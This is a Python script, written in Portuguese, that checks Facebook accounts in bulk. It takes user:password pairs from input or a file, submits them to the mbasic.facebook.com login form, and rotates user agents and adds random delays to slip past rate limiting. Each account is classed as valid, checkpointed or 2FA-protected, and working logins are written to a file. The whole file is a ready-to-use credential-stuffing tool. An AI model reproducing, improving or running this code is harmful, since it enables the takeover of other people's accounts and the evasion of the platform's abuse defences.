import requests
import os
import sys
from bs4 import BeautifulSoup
import time
import random

def limpar_tela():
    if "win" in sys.platform.lower():
        try:
            os.system("cls")
        except:
            pass
    else:
        try:
            os.system("clear")
        except:
            pass


ok, cp, error = 0, 0, 0


class Principal:
    def __init__(self, useragent_list):
        self.ua_list = useragent_list
        self.host = "mbasic.facebook.com"

    def get_random_user_agent(self):
        return random.choice(self.ua_list)


class Autenticacao(Principal):
    def verificar_opcoes(self, sessao, resposta, usuario, senha):
        ref = BeautifulSoup(resposta.text, "html.parser")
        formulario = ref.find("form", {"method": "post", "enctype": True})
        dados = {x.get("name"): x.get("value") for x in formulario.findAll("input", {"type": "hidden", "value": True})}
        dados.update(
            {
                "submit[Continue]": "Continuar"
            }
        )
        resposta = BeautifulSoup(sessao.post("https://mbasic.facebook.com" + str(formulario.get("action")), data=dados).text, "html.parser")
        try:
            opcoes = [x.string for x in resposta.find("select", {"id": "verification_method", "name": "verification_method"}).findAll("option")]
        except:
            opcoes = []
            status = "a2f ativado"
        if len(opcoes) == 0 and status != "a2f ativado":
            status = "toque sim"
        elif len(opcoes) != 0:
            status = "checkpoint"
        else:
            status = "a2f ativado"
        saida = {
            "conta": "{}:{}".format(usuario.strip('\x00'), senha.strip('\x00')),
            "resultado": {
                "status": status,
                "opcoes": opcoes,
                "quantidade_opcoes": len(opcoes)
            }
        }
        return saida

    def log_mfacebook(self, usuario, senha):
        global ok, cp, error
        with requests.Session() as sessao:
            sessao.headers.update(
                {
                    "host": self.host,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "en-US,en;q=0.9,id;q=0.8",
                    "cache-control": "max-age=0",
                    "upgrade-insecure-requests": "1",
                    "user-agent": self.get_random_user_agent()  # Alterando o User-Agent aleatoriamente
                }
            )
            fbml = sessao.get("https://mbasic.facebook.com/fbml/ajax/dialog/")
            time.sleep(random.uniform(1, 3))  # Adicionando um delay aleatório entre 1 e 3 segundos
            sopa = BeautifulSoup(fbml.text, "html.parser")
            proxima_url = sopa.findAll("a", {"class": True, "id": True})[1].get("href")
            sessao.headers.update(
                {
                    "referer": "https://mbasic.facebook.com/fbml/ajax/dialog/",
                }
            )
            ref = BeautifulSoup(sessao.options(proxima_url).text, "html.parser")
            formulario = ref.find("form", {"method": "post", "id": "login_form"})
            dados = {x.get("name"): x.get("value") for x in formulario.findAll("input", {"type": "hidden", "value": True})}
            proximo_para = formulario.get("action")
            dados.update(
                {
                    "email": usuario,
                    "pass": senha,
                    "login": "Entrar"
                }
            )
            resposta = sessao.post("https://mbasic.facebook.com" + str(proximo_para), data=dados, headers={
                "content-length": "164",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://mbasic.facebook.com",
                "referer": "https://mbasic.facebook.com" + str(proximo_para)
            })
            time.sleep(random.uniform(1, 3))  # Adicionando um delay aleatório entre 1 e 3 segundos
            try:
                if "checkpoint" in resposta.cookies:
                    cp += 1
                    saida = self.verificar_opcoes(sessao, resposta, usuario, senha)
                    if saida["resultado"]["status"] == "OK":
                        with open("validos.txt", "a") as arquivo_validos:
                            arquivo_validos.write("{}\n".format(saida['conta']))
                            if saida["resultado"]["status"] not in [None, "Invalid username or password"]:
                                print(saida)
                elif "m_page_voice" in resposta.cookies:
                    ok += 1
                    saida = {
                        "conta": "{}:{}".format(usuario.strip('\x00'), senha.strip('\x00')),
                        "resultado": {
                            "status": "OK",
                            "opcoes": None,
                            "quantidade_opcoes": None
                        }
                    }
                    if saida["resultado"]["status"] not in [None, "Invalid username or password"]:
                        print(saida)
                else:
                    error += 1
                    sopa = BeautifulSoup(resposta.text, "html.parser")
                    try:
                        status = sopa.find("div", {"id": "login_error"}).string
                    except:
                        status = "atividade excessiva detectada [spam]. por favor, desative o modo avião!"
                    saida = {
                        "conta": "{}:{}".format(usuario.strip('\x00'), senha.strip('\x00')),
                        "resultado": {
                            "status": status,
                            "opcoes": False,
                            "quantidade_opcoes": False
                        }
                    }
                    if saida["resultado"]["status"] not in [None, "Invalid username or password"]:
                        print(saida)
            except Exception as e:
                print(resposta.text)
            return saida

if __name__ == "__main__":
    limpar_tela()
    try:
        ua_list = open("data/useragent.txt", "r").readlines()
    except:
        try:
            os.mkdir("data")
        except:
            pass
        print(
            " {} não contém useragent!\n () Visite: https://latip176.github.io/getMyUserAgent/ e copie o valor do seu UserAgent\n")
        open("data/useragent.txt", "a").write(input(" > Cole aqui: ") + " [FB_IAB/FB4A;FBAV/35.0.0.48.273;]")
        exit(" Reinicie este script!")
    if not ua_list:
        os.remove("data/useragent.txt")
        exit(" ! UserAgent não encontrado !\n Reinicie.")
    LOg = Autenticacao(ua_list)
    print("""
    Bem-vindo! Use com sabedoria.

        [1]> Verificar uma conta por vez
        [2]> Verificar contas a partir de um arquivo [formato: usuário:senha]

    Escolha uma opção ^^
    """)
    escolha = input(" > Escolha: ")
    if escolha == "1":
        dados = input(" >= usuário:senha: ")
        print()
        usuario, senha = dados.split(":")
        saida = LOg.log_mfacebook(usuario, senha)
        if saida["resultado"]["status"] not in [None, "Invalid username or password"]:
            print(saida)
    elif escolha == "2":
        dados = input(" >= nome do arquivo: ")
        print()
        try:
            with open(dados, "r", encoding="utf-8") as arquivo:
                for linha in arquivo.readlines():
                    linha = linha.strip()
                    if ":" in linha:
                        usuario, senha = linha.split(":", 1)
                        usuario = usuario.strip('\x00')
                        senha = senha.strip('\x00')
                        saida = LOg.log_mfacebook(usuario, senha)
                        if saida["resultado"]["status"] not in [None, "Invalid username or password"]:
                            print(saida)
                    else:
                        print(f"Formato inválido na linha: {linha}")
        except FileNotFoundError:
            exit("Arquivo não encontrado")
    else:
        print(" !! Tu é cego miséria? !!")
